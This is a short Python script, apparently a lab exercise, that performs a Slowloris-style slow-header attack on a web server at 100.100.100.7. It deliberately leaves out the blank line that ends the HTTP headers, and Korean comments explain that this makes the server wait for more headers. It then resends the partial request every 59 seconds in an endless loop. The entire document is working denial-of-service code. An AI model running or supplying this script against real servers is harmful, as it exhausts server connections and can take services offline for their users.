import socket
import struct
import time

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(('100.100.100.7',80))

request = "GET /index.html HTTP/1.1\r\n"  	#start-line
request += "HOST: 100.100.100.7\r\n"		#header-Filed
request += "Cache-Control: nocache\r\n"		#...
#request += "\r\n"				#End
						#\r\n을 제거 => 헤더의 끝을 제거
						# => 서버에서는 아직 헤더값이 남아있다고 인식
response = ''

while True:
	sock.send( request.encode() )
	response = sock.recv(65535)
	time.sleep(59)


